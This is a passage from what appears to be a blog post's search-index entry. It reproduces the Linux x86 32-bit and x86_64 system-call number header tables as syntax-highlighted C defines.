+<span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 342</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 343</span>
+<span class="meta">#<span class="keyword">define</span> __NR_syncfs 344</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 345</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setns 346</span>
+<span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 347</span>
+<span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 348</span>
+<span class="meta">#<span class="keyword">define</span> __NR_kcmp 349</span>
+<span class="meta">#<span class="keyword">define</span> __NR_finit_module 350</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 351</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 352</span>
+<span class="meta">#<span class="keyword">define</span> __NR_renameat2 353</span>
+<span class="meta">#<span class="keyword">define</span> __NR_seccomp 354</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getrandom 355</span>
+<span class="meta">#<span class="keyword">define</span> __NR_memfd_create 356</span>
+<span class="meta">#<span class="keyword">define</span> __NR_bpf 357</span>
+<span class="meta">#<span class="keyword">define</span> __NR_execveat 358</span>
+<span class="meta">#<span class="keyword">define</span> __NR_socket 359</span>
+<span class="meta">#<span class="keyword">define</span> __NR_socketpair 360</span>
+<span class="meta">#<span class="keyword">define</span> __NR_bind 361</span>
+<span class="meta">#<span class="keyword">define</span> __NR_connect 362</span>
+<span class="meta">#<span class="keyword">define</span> __NR_listen 363</span>
+<span class="meta">#<span class="keyword">define</span> __NR_accept4 364</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getsockopt 365</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setsockopt 366</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getsockname 367</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpeername 368</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sendto 369</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sendmsg 370</span>
+<span class="meta">#<span class="keyword">define</span> __NR_recvfrom 371</span>
+<span class="meta">#<span class="keyword">define</span> __NR_recvmsg 372</span>
+<span class="meta">#<span class="keyword">define</span> __NR_shutdown 373</span>
+<span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 374</span>
+<span class="meta">#<span class="keyword">define</span> __NR_membarrier 375</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mlock2 376</span>
+<span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 377</span>
+<span class="meta">#<span class="keyword">define</span> __NR_preadv2 378</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pwritev2 379</span>
+
+<span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_32_H */</span></span></code></pre>
+
+<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><pre><code class="highlight c"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span>
+<span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_64_H 1</span>
+
+<span class="meta">#<span class="keyword">define</span> __NR_read 0</span>
+<span class="meta">#<span class="keyword">define</span> __NR_write 1</span>
+<span class="meta">#<span class="keyword">define</span> __NR_open 2</span>
+<span class="meta">#<span class="keyword">define</span> __NR_close 3</span>
+<span class="meta">#<span class="keyword">define</span> __NR_stat 4</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fstat 5</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lstat 6</span>
+<span class="meta">#<span class="keyword">define</span> __NR_poll 7</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lseek 8</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mmap 9</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mprotect 10</span>
+<span class="meta">#<span class="keyword">define</span> __NR_munmap 11</span>
+<span class="meta">#<span class="keyword">define</span> __NR_brk 12</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 13</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 14</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 15</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ioctl 16</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pread64 17</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pwrite64 18</span>
+<span class="meta">#<span class="keyword">define</span> __NR_readv 19</span>
+<span class="meta">#<span class="keyword">define</span> __NR_writev 20</span>
+<span class="meta">#<span class="keyword">define</span> __NR_access 21</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pipe 22</span>
+<span class="meta">#<span class="keyword">define</span> __NR_select 23</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_yield 24</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mremap 25</span>
+<span class="meta">#<span class="keyword">define</span> __NR_msync 26</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mincore 27</span>
+<span class="meta">#<span class="keyword">define</span> __NR_madvise 28</span>
+<span class="meta">#<span class="keyword">define</span> __NR_shmget 29</span>
+<span class="meta">#<span class="keyword">define</span> __NR_shmat 30</span>
+<span class="meta">#<span class="keyword">define</span> __NR_shmctl 31</span>
+<span class="meta">#<span class="keyword">define</span> __NR_dup 32</span>
+<span class="meta">#<span class="keyword">define</span> __NR_dup2 33</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pause 34</span>
+<span class="meta">#<span class="keyword">define</span> __NR_nanosleep 35</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getitimer 36</span>
+<span class="meta">#<span class="keyword">define</span> __NR_alarm 37</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setitimer 38</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpid 39</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sendfile 40</span>
+<span class="meta">#<span class="keyword">define</span> __NR_socket 41</span>
+<span class="meta">#<span class="keyword">define</span> __NR_connect 42</span>
+<span class="meta">#<span class="keyword">define</span> __NR_accept 43</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sendto 44</span>
+<span class="meta">#<span class="keyword">define</span> __NR_recvfrom 45</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sendmsg 46</span>
+<span class="meta">#<span class="keyword">define</span> __NR_recvmsg 47</span>
+<span class="meta">#<span class="keyword">define</span> __NR_shutdown 48</span>
+<span class="meta">#<span class="keyword">define</span> __NR_bind 49</span>
+<span class="meta">#<span class="keyword">define</span> __NR_listen 50</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getsockname 51</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpeername 52</span>
+<span class="meta">#<span class="keyword">define</span> __NR_socketpair 53</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setsockopt 54</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getsockopt 55</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clone 56</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fork 57</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vfork 58</span>
+<span class="meta">#<span class="keyword">define</span> __NR_execve 59</span>
+<span class="meta">#<span class="keyword">define</span> __NR_exit 60</span>
+<span class="meta">#<span class="keyword">define</span> __NR_wait4 61</span>
+<span class="meta">#<span class="keyword">define</span> __NR_kill 62</span>
+<span class="meta">#<span class="keyword">define</span> __NR_uname 63</span>
+<span class="meta">#<span class="keyword">define</span> __NR_semget 64</span>
+<span class="meta">#<span class="keyword">define</span> __NR_semop 65</span>
+<span class="meta">#<span class="keyword">define</span> __NR_semctl 66</span>
+<span class="meta">#<span class="keyword">define</span> __NR_shmdt 67</span>
+<span class="meta">#<span class="keyword">define</span> __NR_msgget 68</span>
+<span class="meta">#<span class="keyword">define</span> __NR_msgsnd 69</span>
+<span class="meta">#<span class="keyword">define</span> __NR_msgrcv 70</span>
+<span class="meta">#<span class="keyword">define</span> __NR_msgctl 71</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fcntl 72</span>
+<span class="meta">#<span class="keyword">define</span> __NR_flock 73</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fsync 74</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fdatasync 75</span>
+<span class="meta">#<span class="keyword">define</span> __NR_truncate 76</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ftruncate 77</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getdents 78</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getcwd 79</span>
+<span class="meta">#<span class="keyword">define</span> __NR_chdir 80</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchdir 81</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rename 82</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mkdir 83</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rmdir 84</span>
+<span class="meta">#<span class="keyword">define</span> __NR_creat 85</span>
+<span class="meta">#<span class="keyword">define</span> __NR_link 86</span>
+<span class="meta">#<span class="keyword">define</span> __NR_unlink 87</span>
+<span class="meta">#<span class="keyword">define</span> __NR_symlink 88</span>
+<span class="meta">#<span class="keyword">define</span> __NR_readlink 89</span>
+<span class="meta">#<span class="keyword">define</span> __NR_chmod 90</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchmod 91</span>
+<span class="meta">#<span class="keyword">define</span> __NR_chown 92</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchown 93</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lchown 94</span>
+<span class="meta">#<span class="keyword">define</span> __NR_umask 95</span>
+<span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 96</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getrlimit 97</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getrusage 98</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sysinfo 99</span>
+<span class="meta">#<span class="keyword">define</span> __NR_times 100</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ptrace 101</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getuid 102</span>
+<span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getgid 104</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setuid 105</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setgid 106</span>
+<span class="meta">#<span class="keyword">define</span> __NR_geteuid 107</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getegid 108</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setpgid 109</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getppid 110</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpgrp 111</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setsid 112</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setreuid 113</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setregid 114</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getgroups 115</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setgroups 116</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setresuid 117</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getresuid 118</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setresgid 119</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getresgid 120</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpgid 121</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setfsuid 122</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setfsgid 123</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getsid 124</span>
+<span class="meta">#<span class="keyword">define</span> __NR_capget 125</span>
+<span class="meta">#<span class="keyword">define</span> __NR_capset 126</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 127</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 128</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 129</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 130</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 131</span>
+<span class="meta">#<span class="keyword">define</span> __NR_utime 132</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mknod 133</span>
+<span class="meta">#<span class="keyword">define</span> __NR_uselib 134</span>
+<span class="meta">#<span class="keyword">define</span> __NR_personality 135</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ustat 136</span>
+<span class="meta">#<span class="keyword">define</span> __NR_statfs 137</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fstatfs 138</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sysfs 139</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpriority 140</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setpriority 141</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 142</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 143</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 144</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 145</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 146</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 147</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 148</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mlock 149</span>
+<span class="meta">#<span class="keyword">define</span> __NR_munlock 150</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mlockall 151</span>
+<span class="meta">#<span class="keyword">define</span> __NR_munlockall 152</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vhangup 153</span>
+<span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 154</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pivot_root 155</span>
+<span class="meta">#<span class="keyword">define</span> __NR__sysctl 156</span>
+<span class="meta">#<span class="keyword">define</span> __NR_prctl 157</span>
+<span class="meta">#<span class="keyword">define</span> __NR_arch_prctl 158</span>
+<span class="meta">#<span class="keyword">define</span> __NR_adjtimex 159</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setrlimit 160</span>
+<span class="meta">#<span class="keyword">define</span> __NR_chroot 161</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sync 162</span>
+<span class="meta">#<span class="keyword">define</span> __NR_acct 163</span>
+<span class="meta">#<span class="keyword">define</span> __NR_settimeofday 164</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mount 165</span>
+<span class="meta">#<span class="keyword">define</span> __NR_umount2 166</span>
+<span class="meta">#<span class="keyword">define</span> __NR_swapon 167</span>
+<span class="meta">#<span class="keyword">define</span> __NR_swapoff 168</span>
+<span class="meta">#<span class="keyword">define</span> __NR_reboot 169</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sethostname 170</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setdomainname 171</span>
+<span class="meta">#<span class="keyword">define</span> __NR_iopl 172</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ioperm 173</span>
+<span class="meta">#<span class="keyword">define</span> __NR_create_module 174</span>
+<span class="meta">#<span class="keyword">define</span> __NR_init_module 175</span>
+<span class="meta">#<span class="keyword">define</span> __NR_delete_module 176</span>
+<span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 177</span>
+<span class="meta">#<span class="keyword">define</span> __NR_query_module 178</span>
+<span class="meta">#<span class="keyword">define</span> __NR_quotactl 179</span>
+<span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 180</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getpmsg 181</span>
+<span class="meta">#<span class="keyword">define</span> __NR_putpmsg 182</span>
+<span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 183</span>
+<span class="meta">#<span class="keyword">define</span> __NR_tuxcall 184</span>
+<span class="meta">#<span class="keyword">define</span> __NR_security 185</span>
+<span class="meta">#<span class="keyword">define</span> __NR_gettid 186</span>
+<span class="meta">#<span class="keyword">define</span> __NR_readahead 187</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setxattr 188</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 189</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 190</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getxattr 191</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 192</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 193</span>
+<span class="meta">#<span class="keyword">define</span> __NR_listxattr 194</span>
+<span class="meta">#<span class="keyword">define</span> __NR_llistxattr 195</span>
+<span class="meta">#<span class="keyword">define</span> __NR_flistxattr 196</span>
+<span class="meta">#<span class="keyword">define</span> __NR_removexattr 197</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 198</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 199</span>
+<span class="meta">#<span class="keyword">define</span> __NR_tkill 200</span>
+<span class="meta">#<span class="keyword">define</span> __NR_time 201</span>
+<span class="meta">#<span class="keyword">define</span> __NR_futex 202</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 203</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 204</span>
+<span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 205</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_setup 206</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_destroy 207</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_getevents 208</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_submit 209</span>
+<span class="meta">#<span class="keyword">define</span> __NR_io_cancel 210</span>
+<span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 211</span>
+<span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 212</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_create 213</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl_old 214</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_wait_old 215</span>
+<span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 216</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getdents64 217</span>
+<span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 218</span>
+<span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 219</span>
+<span class="meta">#<span class="keyword">define</span> __NR_semtimedop 220</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fadvise64 221</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_create 222</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_settime 223</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 224</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 225</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timer_delete 226</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_settime 227</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 228</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_getres 229</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 230</span>
+<span class="meta">#<span class="keyword">define</span> __NR_exit_group 231</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 232</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 233</span>
+<span class="meta">#<span class="keyword">define</span> __NR_tgkill 234</span>
+<span class="meta">#<span class="keyword">define</span> __NR_utimes 235</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vserver 236</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mbind 237</span>
+<span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 238</span>
+<span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 239</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_open 240</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 241</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 242</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 243</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_notify 244</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 245</span>
+<span class="meta">#<span class="keyword">define</span> __NR_kexec_load 246</span>
+<span class="meta">#<span class="keyword">define</span> __NR_waitid 247</span>
+<span class="meta">#<span class="keyword">define</span> __NR_add_key 248</span>
+<span class="meta">#<span class="keyword">define</span> __NR_request_key 249</span>
+<span class="meta">#<span class="keyword">define</span> __NR_keyctl 250</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 251</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 252</span>
+<span class="meta">#<span class="keyword">define</span> __NR_inotify_init 253</span>
+<span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 254</span>
+<span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 255</span>
+<span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 256</span>
+<span class="meta">#<span class="keyword">define</span> __NR_openat 257</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mkdirat 258</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mknodat 259</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchownat 260</span>
+<span class="meta">#<span class="keyword">define</span> __NR_futimesat 261</span>
+<span class="meta">#<span class="keyword">define</span> __NR_newfstatat 262</span>
+<span class="meta">#<span class="keyword">define</span> __NR_unlinkat 263</span>
+<span class="meta">#<span class="keyword">define</span> __NR_renameat 264</span>
+<span class="meta">#<span class="keyword">define</span> __NR_linkat 265</span>
+<span class="meta">#<span class="keyword">define</span> __NR_symlinkat 266</span>
+<span class="meta">#<span class="keyword">define</span> __NR_readlinkat 267</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fchmodat 268</span>
+<span class="meta">#<span class="keyword">define</span> __NR_faccessat 269</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pselect6 270</span>
+<span class="meta">#<span class="keyword">define</span> __NR_ppoll 271</span>
+<span class="meta">#<span class="keyword">define</span> __NR_unshare 272</span>
+<span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 273</span>
+<span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 274</span>
+<span class="meta">#<span class="keyword">define</span> __NR_splice 275</span>
+<span class="meta">#<span class="keyword">define</span> __NR_tee 276</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 277</span>
+<span class="meta">#<span class="keyword">define</span> __NR_vmsplice 278</span>
+<span class="meta">#<span class="keyword">define</span> __NR_move_pages 279</span>
+<span class="meta">#<span class="keyword">define</span> __NR_utimensat 280</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 281</span>
+<span class="meta">#<span class="keyword">define</span> __NR_signalfd 282</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 283</span>
+<span class="meta">#<span class="keyword">define</span> __NR_eventfd 284</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fallocate 285</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 286</span>
+<span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 287</span>
+<span class="meta">#<span class="keyword">define</span> __NR_accept4 288</span>
+<span class="meta">#<span class="keyword">define</span> __NR_signalfd4 289</span>
+<span class="meta">#<span class="keyword">define</span> __NR_eventfd2 290</span>
+<span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 291</span>
+<span class="meta">#<span class="keyword">define</span> __NR_dup3 292</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pipe2 293</span>
+<span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 294</span>
+<span class="meta">#<span class="keyword">define</span> __NR_preadv 295</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pwritev 296</span>
+<span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 297</span>
+<span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 298</span>
+<span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 299</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 300</span>
+<span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 301</span>
+<span class="meta">#<span class="keyword">define</span> __NR_prlimit64 302</span>
+<span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 303</span>
+<span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 304</span>
+<span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 305</span>
+<span class="meta">#<span class="keyword">define</span> __NR_syncfs 306</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 307</span>
+<span class="meta">#<span class="keyword">define</span> __NR_setns 308</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getcpu 309</span>
+<span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 310</span>
+<span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 311</span>
+<span class="meta">#<span class="keyword">define</span> __NR_kcmp 312</span>
+<span class="meta">#<span class="keyword">define</span> __NR_finit_module 313</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 314</span>
+<span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 315</span>
+<span class="meta">#<span class="keyword">define</span> __NR_renameat2 316</span>
+<span class="meta">#<span class="keyword">define</span> __NR_seccomp 317</span>
+<span class="meta">#<span class="keyword">define</span> __NR_getrandom 318</span>
+<span class="meta">#<span class="keyword">define</span> __NR_memfd_create 319</span>
+<span class="meta">#<span class="keyword">define</span> __NR_kexec_file_load 320</span>
+<span class="meta">#<span class="keyword">define</span> __NR_bpf 321</span>
+<span class="meta">#<span class="keyword">define</span> __NR_execveat 322</span>
+<span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 323</span>
+<span class="meta">#<span class="keyword">define</span> __NR_membarrier 324</span>
+<span class="meta">#<span class="keyword">define</span> __NR_mlock2 325</span>
+<span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 326</span>
+<span class="meta">#<span class="keyword">define</span> __NR_preadv2 327</span>
+<span class="meta">#<span class="keyword">define</span> __NR_pwritev2 328</span>
+
+<span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_64_H */</span></span></code></pre>]]></content>
   </entry>
 </search>
